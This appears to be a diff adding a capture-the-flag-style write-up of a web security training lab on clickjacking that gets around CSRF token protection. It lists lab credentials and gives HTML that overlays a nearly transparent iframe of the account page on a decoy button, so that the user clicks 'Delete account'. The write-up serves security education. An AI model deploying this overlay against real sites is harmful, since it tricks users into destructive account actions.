@@ -1,0 +1,49 @@
+Basic Clickjacking with CSRF Token Protection
+
+**Category**: Clickjacking  
+**Difficulty**: Apprentice  
+
+---
+
+## Overview / What I Learned
+
+This lab demonstrates how clickjacking can be used to bypass CSRF protections when a CSRF token is implemented correctly but user interaction is not adequately protected.
+
+Key learnings:
+- Even with CSRF tokens in place, clickjacking can trick users into performing sensitive actions.
+- Transparency and position-based manipulation of iframes can deceive users into clicking buttons like "Delete account."
+- Real-world attackers could chain CSRF + clickjacking in the same attack scenario.
+
+---
+
+## Exploit Steps / Attack Methodology
+
+### 1. Setup
+
+- Logged into the lab with test credentials: `wiener:peter`
+- Navigated to `/my-account` to locate the "Delete account" button.
+- Verified that deleting an account requires a POST request with a valid CSRF token
+
+### 2. Exploit Page Construction
+
+Crafted the following HTML to embed the target page inside an iframe, and overlaid a fake button using a positioned `div`:
+
+```html
+<style>
+  iframe {
+    position: relative;
+    width: 500px;
+    height: 700px;
+    opacity: 0.0001;
+    z-index: 2;
+  }
+  div {
+    position: absolute;
+    top: 300px;
+    left: 60px;
+    z-index: 1;
+  }
+</style>
+
+<div>Click me</div>
+<iframe src="https://Lab-ID.web-security-academy.net/my-account"></iframe>
